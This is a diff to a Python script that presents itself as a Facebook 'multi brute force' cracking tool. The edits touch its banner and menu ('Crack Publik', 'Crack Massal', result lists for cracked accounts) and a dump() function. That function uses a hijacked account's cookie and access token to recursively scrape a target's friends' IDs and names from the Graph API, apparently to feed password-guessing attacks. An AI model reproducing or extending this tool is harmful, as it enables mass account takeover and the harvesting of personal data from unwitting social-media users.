@@ -175,11 +175,11 @@ def banner():
       if "win" in sys.platform:os.system("cls")
       else:os.system("clear")
       print(f'''{biru}\t ____        ______                      __   
-     \t / __ \__  __/ / __ \___  _________  ____/ /__  _____
-    \t/ /_/ / / / / / /_/ / _ \/ ___/ __ \/ __  / _ \/ ___/
+      \t / __ \__  __/ / __ \___  _________  ____/ /__  _____
+     \t/ /_/ / / / / / /_/ / _ \/ ___/ __ \/ __  / _ \/ ___/
   \t/ _, _/ /_/ / / _, _/  __/ /__/ /_/ / /_/ /  __/ /    
-\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}\n
-\t\t• {m}Multi Brute Force Facebook{xxx}\n •
+/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}\n
+\t\t• {m}Multi Brute Force Facebook{xxx} •
 \t\t {u}author by {K}RulRecoder''')
 #kukis
 def login3():
@@ -261,12 +261,12 @@ def menu():
 		os.system('clear')
 		login3()
 		banner()
-	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold white"))
-	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]  ON[white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result Cp [[green] ON [white]]\n[[cyan]04[white]] Result Ok [white][[green] ON [white]] \n[[cyan]00[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
+	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green] {nama} [white]] \n[[cyan]•[white]] Idz Tumbal [white][[green] {uidfb} [white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold white"))
+	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green] ON [white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result Cp [[green] ON [white]]\n[[cyan]04[white]] Result Ok [white][[green] ON [white]] \n[[cyan]00[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
 	CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
 	if CYXIEON_GANTENG in ['01','1']:
-	        idt = input('\n>> ID Target : ')
+	        idt = input('\n└──[ ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
@@ -361,13 +361,13 @@ def dump(idt,fields,cookie,token):
 				"access_token": token,
 				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
 			}
-		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cok).json()
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
 			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
-		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cok,token)
 	except:pass
 	      
 
